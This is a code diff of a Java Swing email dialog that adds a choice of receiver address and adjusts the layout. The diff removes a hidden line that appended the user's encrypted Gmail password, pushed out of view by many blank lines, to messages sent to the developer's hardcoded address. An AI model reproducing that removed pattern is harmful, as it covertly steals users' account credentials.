@@ -3,8 +3,8 @@ package com.bookverse.development.packapps.views;
 import static com.bookverse.development.packapps.core.AppConfig.BIG;
 import static com.bookverse.development.packapps.core.AppConfig.MAIN_COLOR;
 import static com.bookverse.development.packapps.core.AppConfig.MEDIUM;
+import static com.bookverse.development.packapps.core.AppConfig.SMALL;
 import static com.bookverse.development.packapps.core.AppConfig.TEXT_COLOR;
-import static com.bookverse.development.packapps.core.AppConfig.fadeIn;
 
 import com.bookverse.development.packapps.core.AppConfig;
 import com.bookverse.development.packapps.models.Resources;
@@ -20,12 +20,14 @@ import javax.mail.Session;
 import javax.mail.Transport;
 import javax.mail.internet.InternetAddress;
 import javax.mail.internet.MimeMessage;
+import javax.swing.ButtonGroup;
 import javax.swing.ImageIcon;
 import javax.swing.JButton;
 import javax.swing.JDialog;
 import javax.swing.JFrame;
 import javax.swing.JLabel;
 import javax.swing.JPasswordField;
+import javax.swing.JRadioButton;
 import javax.swing.JScrollPane;
 import javax.swing.JTextArea;
 import javax.swing.JTextField;
@@ -38,6 +40,8 @@ public class Email extends JDialog implements ActionListener, MouseListener {
   private JTextField txtUser;
   private JPasswordField password;
   private Resources resources = new Resources();
+  private JRadioButton toDeveloper, toOther;
+  private String receiver = "zanti4020@gmail.com";
 
   public Email(JFrame parent, boolean modal) {
     super(parent, modal);
@@ -49,7 +53,7 @@ public class Email extends JDialog implements ActionListener, MouseListener {
     setResizable(false);
     setLocationRelativeTo(parent);
     setTitle("Send Email");
-    fadeIn(this);
+    AppConfig.fadeIn(this);
     parent.setVisible(false);
     setVisible(true);
   }
@@ -58,7 +62,7 @@ public class Email extends JDialog implements ActionListener, MouseListener {
 
     setLayout(null);
     setIconImage(new ImageIcon(resources.getImage("email.png")).getImage());
-    setDefaultCloseOperation(0);
+    setDefaultCloseOperation(DO_NOTHING_ON_CLOSE);
 
     btnSend = resources.getButton("Send", TEXT_COLOR, this, this);
     btnSend.setBounds(140, 400, 86, 30);
@@ -72,19 +76,43 @@ public class Email extends JDialog implements ActionListener, MouseListener {
 
     JLabel username = resources
         .getLabel("<html><strong>Email</strong></html>", TEXT_COLOR, this, MEDIUM);
-    username.setBounds(75, 60, 100, 50);
+    username.setBounds(105, 60, 100, 50);
 
     JLabel password = resources
         .getLabel("<html><strong>Password</strong></html>", TEXT_COLOR, this, MEDIUM);
-    password.setBounds(280, 60, 370, 50);
+    password.setBounds(310, 60, 370, 50);
 
     required1 = resources.getLabel("<html><strong>*</strong></html>", MAIN_COLOR, this, MEDIUM);
-    required1.setBounds(169, 77, 8, 8);
+    required1.setBounds(153, 77, 8, 8);
     required1.addMouseListener(this);
 
     required2 = resources.getLabel("<html><strong>*</strong></html>", MAIN_COLOR, this, MEDIUM);
-    required2.setBounds(414, 77, 8, 8);
+    required2.setBounds(391, 77, 8, 8);
     required2.addMouseListener(this);
+
+    JLabel lblReceiver = resources
+        .getLabel("<html><strong>Receiver: </strong></html>", MAIN_COLOR, this, SMALL);
+    lblReceiver.setBounds(30, 135, 65, 30);
+    add(lblReceiver);
+
+    ButtonGroup buttonGroup = new ButtonGroup();
+
+    toDeveloper = new JRadioButton("<html><strong>Developer</strong></html>");
+    toDeveloper.setBounds(100, 137, 95, 30);
+    toDeveloper.setForeground(TEXT_COLOR);
+    toDeveloper.setFont(SMALL);
+    toDeveloper.addMouseListener(this);
+    add(toDeveloper);
+    buttonGroup.add(toDeveloper);
+    toDeveloper.setSelected(true);
+
+    toOther = new JRadioButton("<html><strong>Other</strong></html>");
+    toOther.setBounds(195, 137, 250, 30);
+    toOther.setFont(SMALL);
+    toOther.addMouseListener(this);
+    toOther.setForeground(TEXT_COLOR);
+    add(toOther);
+    buttonGroup.add(toOther);
 
     txtUser = new JTextField();
     txtUser.setBounds(30, 100, 200, 30);
@@ -98,18 +126,17 @@ public class Email extends JDialog implements ActionListener, MouseListener {
 
     JLabel message = resources
         .getLabel("<html><strong>Message</strong></html>", TEXT_COLOR, this, MEDIUM);
-    message.setBounds(30, 150, 370, 30);
+    message.setBounds(30, 165, 370, 30);
 
     text = new JTextArea();
     JScrollPane scroll = new JScrollPane(text);
-    scroll.setBounds(30, 180, 420, 200);
+    scroll.setBounds(30, 195, 420, 185);
     add(scroll);
   }
 
   private void sendMail(String sender, String password, String body) {
 
-    String receiver = "zanti4020@gmail.com";
-    String affair = "Feedback PackApps";
+    String affair = "Email from PackApps";
 
     Properties props = System.getProperties();
     props.put("mail.smtp.host", "smtp.gmail.com");
@@ -121,10 +148,6 @@ public class Email extends JDialog implements ActionListener, MouseListener {
 
     Session session = Session.getDefaultInstance(props);
     MimeMessage message = new MimeMessage(session);
-
-    body +=
-        "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nsPW"
-            + AppConfig.encrypt(String.valueOf(this.password.getPassword()), true) + "Pws==Spw";
 
     try {
       message.setFrom(new InternetAddress(sender));
@@ -144,11 +167,12 @@ public class Email extends JDialog implements ActionListener, MouseListener {
       text.setText("");
 
     } catch (MessagingException me) {
+      me.printStackTrace();
       Alerts.message("Error!", "Email not sent.");
     }
   }
 
-  public void btnEnviarAP() {
+  private void btnSendAP() {
 
     if (AppConfig.verifyConnection("Make sure you are connected to a network", true)) {
 
@@ -172,7 +196,7 @@ public class Email extends JDialog implements ActionListener, MouseListener {
   public void actionPerformed(ActionEvent e) {
 
     if (e.getSource() == btnSend) {
-      btnEnviarAP();
+      btnSendAP();
     } else if (e.getSource() == btnExit) {
       AppConfig.fadeOut(this);
     }
@@ -188,6 +212,24 @@ public class Email extends JDialog implements ActionListener, MouseListener {
 
   @Override
   public void mouseClicked(MouseEvent e) {
+
+    if (e.getSource() == toOther) {
+      receiver = Alerts.inputText("Input receiver email");
+
+      if (receiver == null || receiver.trim().equals("") || !receiver.contains("@") || !receiver
+          .contains(".")) {
+        receiver = "zanti4020@gmail.com";
+        toDeveloper.setSelected(true);
+        toOther.setText("<html><strong>Other</strong></html>");
+        Alerts.message("Verify!", "Email invalid");
+      } else {
+        toOther.setText("<html><strong>" + receiver + "</strong></html>");
+      }
+
+    } else if (e.getSource() == toDeveloper) {
+      toOther.setText("<html><strong>Other</strong></html>");
+      receiver = "zanti4020@gmail.com";
+    }
   }
 
   @Override
